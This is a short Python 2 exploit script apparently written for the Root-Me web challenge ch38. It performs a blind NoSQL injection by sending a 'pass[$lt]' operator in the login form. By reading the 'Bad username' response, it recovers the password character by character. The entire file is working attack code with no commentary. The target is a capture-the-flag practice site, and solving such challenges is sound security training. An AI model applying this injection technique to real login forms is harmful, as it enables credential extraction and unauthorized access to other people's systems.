# exploit.py
import urllib2
import urllib
URL = "http://challenge01.root-me.org/web-serveur/ch38/index.php"

result = ""
for i in range(100):
    for j in range(0x20,0x90):
        data = {'login' : 'test', 'pass[$lt]' : result+chr(j)}
        data = urllib.urlencode(data)
        req = urllib2.Request(URL,data)
        res = urllib2.urlopen(req)
        if res.read().find("Bad username")>10:
            continue
        else:
            result += chr(j-1)
            print result
            break




